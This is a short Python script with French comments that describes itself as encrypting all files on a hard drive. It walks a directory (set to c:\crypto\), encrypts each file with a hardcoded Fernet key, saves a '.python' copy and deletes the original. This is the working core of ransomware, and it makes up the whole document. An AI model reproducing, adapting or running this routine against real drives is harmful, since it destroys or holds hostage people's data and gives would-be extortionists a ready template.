
# Ce script permet de crypter tous les fichiers d'un disque dur. 

import os 
from cryptography.fernet import Fernet 

# Définir le chemin du disque à crypter 
chemin = 'c:\\crypto\\' 

# Generer une nouvelle clé 
# key = Fernet.generate_key()

# Create an encryption key
key = b'ZVEQ3p53kJuXn2EN-ZyJduwRuBtoYzwTQ8NOjxiCTaY=' 

# Instancier Fernet avec la clé générée 
f = Fernet(key) 

# Parcourir tous les fichiers et répertoires sous le chemin spécifié  
for root, dirs, files in os.walk(chemin): 
    for file in files: 
        # Ouvrir le fichier et le crypter 
        with open(os.path.join(root, file), 'rb') as fichier: 
            data = fichier.read() 
            encrypted = f.encrypt(data) 
            # Sauvegarder le fichier crypté avec son nom originel 
            with open(os.path.join(root, file)+".python", 'wb') as fichier: 
                 fichier.write(encrypted)
        os.remove(os.path.join(root, file))         



